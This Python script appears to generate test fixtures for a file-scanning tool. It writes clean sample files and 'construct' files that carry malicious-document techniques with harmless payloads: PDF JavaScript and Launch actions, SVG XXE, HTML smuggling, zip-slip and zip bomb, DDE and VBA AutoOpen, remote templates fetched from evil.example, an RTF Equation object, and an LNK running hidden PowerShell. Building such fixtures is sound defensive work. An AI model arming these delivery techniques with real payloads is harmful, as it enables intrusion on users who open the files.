#!/usr/bin/env python3
"""Generate clean and construct fixtures for file-sentinel tests.

Produces only benign synthetic content that exercises scanner rules.
Does NOT download or include real malware.
"""
from __future__ import annotations

import io
import os
import struct
import sys
import zipfile
import zlib
from pathlib import Path

ROOT = Path(__file__).resolve().parent
OUT = ROOT / "out"
sys.path.insert(0, str(ROOT))
from cfbwriter import build, vba_project, ovba_compress  # noqa: E402

CLEAN = OUT / "clean"
BAD = OUT / "constructs"


def write(path: Path, data: bytes):
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(data)


def png(w=1, h=1, text_chunks=None) -> bytes:
    from PIL import Image
    import struct as st

    buf = io.BytesIO()
    Image.new("RGB", (w, h), (255, 0, 0)).save(buf, format="PNG")
    data = buf.getvalue()
    if not text_chunks:
        return data
    # insert tEXt before IEND
    iend = data.rfind(b"IEND") - 4
    out = data[:iend]
    for k, v in text_chunks:
        payload = k.encode("latin1") + b"\0" + v.encode("latin1")
        out += st.pack(">I", len(payload)) + b"tEXt" + payload + st.pack(">I", zlib.crc32(b"tEXt" + payload) & 0xFFFFFFFF)
    out += data[iend:]
    return out


def jpeg() -> bytes:
    from PIL import Image

    buf = io.BytesIO()
    Image.new("RGB", (8, 8), (0, 128, 255)).save(buf, format="JPEG")
    return buf.getvalue()


def clean_office():
    import docx
    from openpyxl import Workbook
    from pptx import Presentation
    from reportlab.pdfgen import canvas

    d = docx.Document()
    d.add_paragraph("Hello from a clean document.")
    d.save(CLEAN / "clean.docx")

    wb = Workbook()
    wb.active["A1"] = "hello"
    wb.save(CLEAN / "clean.xlsx")

    prs = Presentation()
    prs.slides.add_slide(prs.slide_layouts[5]).shapes.title  # blank
    prs.save(CLEAN / "clean.pptx")

    c = canvas.Canvas(str(CLEAN / "clean.pdf"))
    c.drawString(72, 720, "Clean PDF")
    c.save()

    write(CLEAN / "clean.png", png())
    write(CLEAN / "clean.jpg", jpeg())
    write(CLEAN / "clean.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><rect width="10" height="10"/></svg>\n')
    write(CLEAN / "clean.html", b"<!DOCTYPE html><html><body><p>Hi</p></body></html>\n")
    write(CLEAN / "clean.txt", b"just text\n")
    write(CLEAN / "empty.bin", b"")

    # clean zip
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("readme.txt", "hello")
    write(CLEAN / "clean.zip", buf.getvalue())


def construct_svg_html():
    write(BAD / "svg-script.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')
    write(
        BAD / "svg-handler.svg",
        b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">'
        b'<a xlink:href="javascript:alert(1)"><rect width="10" height="10" onclick="x()"/></a></svg>',
    )
    write(
        BAD / "svg-xxe.svg",
        b'<?xml version="1.0"?>'
        b'<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>'
        b'<svg xmlns="http://www.w3.org/2000/svg">&xxe;</svg>',
    )
    smuggle = bytearray(b'<!DOCTYPE html><html><body><a id="a" download="x.exe"></a>\n<script>\nconst b64 = "')
    smuggle.extend(b"A" * 5000)
    smuggle.extend(b'";\nconst bin = atob(b64);\nconst u8 = new Uint8Array(bin.length);\n')
    smuggle.extend(b'for (let i = 0; i < bin.length; i++) u8[i] = bin.charCodeAt(i);\n')
    smuggle.extend(b'const blob = new Blob([u8]);\nconst a = document.getElementById("a");\n')
    smuggle.extend(b'a.href = URL.createObjectURL(blob);\na.click();\n</script></body></html>\n')
    write(BAD / "html-smuggle.html", bytes(smuggle))
    write(BAD / "html-hta.html", b"<html><hta:application applicationname='x'/><script>alert(1)</script></html>")


def construct_pdf():
    pdf = b"""%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>endobj
4 0 obj<< /Type /Action /S /JavaScript /JS (app.alert\\(1\\);) >>endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000087 00000 n 
0000000144 00000 n 
0000000217 00000 n 
trailer<< /Size 5 /Root 1 0 R >>
startxref
288
%%EOF
"""
    write(BAD / "pdf-js.pdf", pdf)
    # Launch action
    launch = b"""%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>endobj
4 0 obj<< /Type /Action /S /Launch /F (cmd.exe) >>endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000087 00000 n 
0000000144 00000 n 
0000000217 00000 n 
trailer<< /Size 5 /Root 1 0 R >>
startxref
280
%%EOF
"""
    write(BAD / "pdf-launch.pdf", launch)
    # obfuscated name /J#61vaScript
    obf = b"""%PDF-1.4
1 0 obj<< /Type /Catalog /Pages 2 0 R /OpenAction 4 0 R >>endobj
2 0 obj<< /Type /Pages /Kids [3 0 R] /Count 1 >>endobj
3 0 obj<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>endobj
4 0 obj<< /S /J#61vaScript /JS (1) >>endobj
xref
0 5
0000000000 65535 f 
0000000009 00000 n 
0000000087 00000 n 
0000000144 00000 n 
0000000217 00000 n 
trailer<< /Size 5 /Root 1 0 R >>
startxref
270
%%EOF
"""
    write(BAD / "pdf-obfuscated.pdf", obf)


def construct_archives():
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("../evil.txt", b"pwned")
        z.writestr("/abs.txt", b"abs")
    write(BAD / "zip-slip.zip", buf.getvalue())

    # small ratio bomb: 1KB of zeros deflated claiming huge size is hard with zipfile;
    # craft a local+central with mismatched sizes
    name = b"bomb.txt"
    # store a small deflated payload
    raw = b"\0" * 200
    comp = zlib.compress(raw, 9)[2:-4]  # raw deflate
    # declare huge uncompressed size
    usize = 50_000_000
    local = struct.pack("<4sHHHHHIIIHH", b"PK\x03\x04", 20, 0, 8, 0, 0, 0, len(comp), usize, len(name), 0) + name + comp
    cd = struct.pack("<4sHHHHHHIIIHHHHHII", b"PK\x01\x02", 20, 20, 0, 8, 0, 0, 0, len(comp), usize, len(name), 0, 0, 0, 0, 0, 0) + name
    eocd = struct.pack("<4sHHHHIIH", b"PK\x05\x06", 0, 0, 1, 1, len(cd), len(local), 0)
    write(BAD / "zip-bomb.zip", local + cd + eocd)

    # nested
    inner = io.BytesIO()
    with zipfile.ZipFile(inner, "w") as z:
        z.writestr("inner.txt", b"hi")
    outer = io.BytesIO()
    with zipfile.ZipFile(outer, "w") as z:
        z.writestr("nested.zip", inner.getvalue())
    write(BAD / "zip-nested.zip", outer.getvalue())


def construct_polyglot_eicar_rtl():
    write(BAD / "eicar.com", b"X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*")
    # JPEG + ZIP
    j = jpeg()
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("x.txt", b"hi")
    write(BAD / "polyglot.jpg", j + buf.getvalue())
    # RTL override
    pe = b"MZ" + b"\0" * 58 + struct.pack("<I", 0x40) + b"PE\0\0" + b"\0" * 20
    write(BAD / ("invoice\u202efdp.exe"), pe)
    write(BAD / "invoice.pdf.exe", pe)
    # image with script in tEXt
    write(BAD / "png-script.png", png(text_chunks=[("Comment", "<script>alert(1)</script>")]))


def construct_ooxml():
    import docx
    from docx.oxml.ns import qn
    from docx.oxml import OxmlElement
    from lxml import etree

    # DDE via fldSimple
    d = docx.Document()
    p = d.add_paragraph()
    fld = OxmlElement("w:fldSimple")
    fld.set(qn("w:instr"), ' DDEAUTO c:\\windows\\system32\\cmd.exe "/c calc" ')
    r = OxmlElement("w:r")
    t = OxmlElement("w:t")
    t.text = "[DDE]"
    r.append(t)
    fld.append(r)
    p._p.append(fld)
    d.save(BAD / "dde.docx")

    # remote template: add an external attachedTemplate relationship
    d2 = docx.Document()
    d2.add_paragraph("template injection")
    d2.save(BAD / "remote-template.docx")
    # patch the package
    data = (BAD / "remote-template.docx").read_bytes()
    buf = io.BytesIO(data)
    out = io.BytesIO()
    with zipfile.ZipFile(buf, "r") as zin, zipfile.ZipFile(out, "w") as zout:
        for item in zin.infolist():
            if item.filename in ("word/settings.xml", "word/_rels/settings.xml.rels"):
                continue
            zout.writestr(item, zin.read(item.filename))
        settings = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
 xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
  <w:attachedTemplate r:id="rId1"/>
</w:settings>"""
        rels = b"""<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate"
   Target="https://evil.example/template.dotm" TargetMode="External"/>
</Relationships>"""
        # update [Content_Types] if needed - settings usually already present
        zout.writestr("word/settings.xml", settings)
        zout.writestr("word/_rels/settings.xml.rels", rels)
    write(BAD / "remote-template.docx", out.getvalue())

    # docm with vbaProject
    vba = vba_project(
        [
            (
                "ThisDocument",
                'Attribute VB_Name = "ThisDocument"\r\nSub AutoOpen()\r\n  MsgBox "hi"\r\nEnd Sub\r\n',
            )
        ]
    )
    # Build a minimal docm: take clean.docx and add vbaProject + change content type
    clean = (CLEAN / "clean.docx").read_bytes()
    buf = io.BytesIO(clean)
    out = io.BytesIO()
    with zipfile.ZipFile(buf, "r") as zin, zipfile.ZipFile(out, "w") as zout:
        for item in zin.infolist():
            content = zin.read(item.filename)
            if item.filename == "[Content_Types].xml":
                content = content.replace(
                    b"application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
                    b"application/vnd.ms-word.document.macroEnabled.main+xml",
                )
                if b"vbaProject" not in content:
                    content = content.replace(
                        b"</Types>",
                        b'<Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/></Types>',
                    )
            if item.filename == "word/_rels/document.xml.rels":
                if b"vbaProject" not in content:
                    content = content.replace(
                        b"</Relationships>",
                        b'<Relationship Id="rIdVba" Type="http://schemas.microsoft.com/office/2006/relationships/vbaProject" Target="vbaProject.bin"/></Relationships>',
                    )
            zout.writestr(item, content)
        zout.writestr("word/vbaProject.bin", vba)
    write(BAD / "macro.docm", out.getvalue())


def construct_rtf():
    # Equation.3 object with objupdate (CVE-2017-11882 class of bug)
    # Minimal OLE1 Package-like bytes as hex in objdata; class Equation.3
    ole1_cls = b"Equation.3\0"
    # Build a tiny OLE1 native stream: version, format, classname, topic, item, native size+data
    native = b"EQ\0" + b"\0" * 20
    ole1 = (
        struct.pack("<II", 0x00000501, 2)  # OLEVersion, FormatID = embedded
        + struct.pack("<I", len(ole1_cls))
        + ole1_cls
        + struct.pack("<I", 1)
        + b"\0"  # topic
        + struct.pack("<I", 1)
        + b"\0"  # item
        + struct.pack("<I", len(native))
        + native
    )
    hexdata = ole1.hex()
    rtf = (
        r"{\rtf1\ansi{\object\objemb{\*\objclass Equation.3}\objupdate{\*\objdata "
        + hexdata
        + r"}}}"
    )
    write(BAD / "rtf-equation.rtf", rtf.encode("ascii"))
    # remote template
    write(
        BAD / "rtf-template.rtf",
        rb"{\rtf1\ansi{\*\template https://evil.example/t.dotm}\pard hi\par}",
    )


def construct_lnk():
    # Minimal MS-SHLLINK with LinkTargetIDList omitted, LinkInfo omitted, StringData with command
    # HeaderSize=0x4C, CLSID, LinkFlags = HasArguments|IsUnicode|HasRelativePath (0x20|0x80|0x08)
    flags = 0x20 | 0x80 | 0x08  # HasArguments, IsUnicode, HasRelativePath
    header = struct.pack("<I", 0x4C)
    header += bytes.fromhex("0114020000000000c000000000000046")  # CLSID
    header += struct.pack("<I", flags)
    header += struct.pack("<I", 0)  # FileAttributes
    header += b"\0" * 24  # times
    header += struct.pack("<I", 0)  # FileSize
    header += struct.pack("<I", 0)  # IconIndex
    header += struct.pack("<I", 1)  # ShowCommand
    header += struct.pack("<H", 0)  # HotKey
    header += b"\0" * 10  # reserved
    assert len(header) == 0x4C

    def ustr(s: str) -> bytes:
        enc = s.encode("utf-16le")
        return struct.pack("<H", len(s)) + enc

    # RelativePath then Arguments (order per flags: name, relative, working, args, icon)
    body = ustr("powershell.exe") + ustr("-NoP -W Hidden -c calc")
    write(BAD / "evil.lnk", header + body)


def construct_pe_script():
    # Minimal PE
    pe = bytearray(0x400)
    pe[0:2] = b"MZ"
    struct.pack_into("<I", pe, 0x3C, 0x80)
    pe[0x80:0x84] = b"PE\0\0"
    struct.pack_into("<H", pe, 0x84, 0x14C)  # i386
    struct.pack_into("<H", pe, 0x86, 0)  # NumberOfSections
    struct.pack_into("<H", pe, 0x94, 0xE0)  # SizeOfOptionalHeader
    struct.pack_into("<H", pe, 0x96, 0x0102)  # Characteristics executable
    struct.pack_into("<H", pe, 0x98, 0x10B)  # PE32 magic
    struct.pack_into("<H", pe, 0x98 + 68, 3)  # subsystem console
    write(BAD / "tiny.exe", bytes(pe))
    write(BAD / "script.ps1", b"Write-Host hello\n")
    write(BAD / "script.vbs", b'MsgBox "hi"\n')
    write(BAD / "encoded.jse", b"#@~^AAAA\nencoded\n")


def main():
    for d in (CLEAN, BAD):
        if d.exists():
            for p in d.rglob("*"):
                if p.is_file():
                    p.unlink()
        d.mkdir(parents=True, exist_ok=True)
    clean_office()
    construct_svg_html()
    construct_pdf()
    construct_archives()
    construct_polyglot_eicar_rtl()
    construct_ooxml()
    construct_rtf()
    construct_lnk()
    construct_pe_script()
    # README
    (OUT / "README.md").write_text(
        """# Test fixtures

Generated by `scripts/fixtures/generate.py`. Do not hand-edit.

- `clean/` — benign files from LibreOffice-compatible Python libraries (python-docx,
  openpyxl, python-pptx, reportlab, Pillow). Must scan as `clean`.
- `constructs/` — synthetic files that contain the constructs the scanner looks for
  (SVG script, PDF JavaScript, VBA AutoOpen, DDE, zip-slip, EICAR, …).
  **No real malware.** Built locally; nothing is downloaded.

Tool versions are recorded in `VERSIONS.txt`.
"""
    )
    import docx, openpyxl, pptx, reportlab, PIL, olefile

    (OUT / "VERSIONS.txt").write_text(
        f"python-docx {docx.__version__}\nopenpyxl {openpyxl.__version__}\n"
        f"python-pptx {pptx.__version__}\nreportlab {reportlab.Version}\n"
        f"Pillow {PIL.__version__}\nolefile {olefile.__version__}\n"
    )
    print(f"Wrote fixtures under {OUT}")
    for p in sorted(OUT.rglob("*")):
        if p.is_file():
            print(f"  {p.relative_to(OUT)} ({p.stat().st_size} B)")


if __name__ == "__main__":
    main()
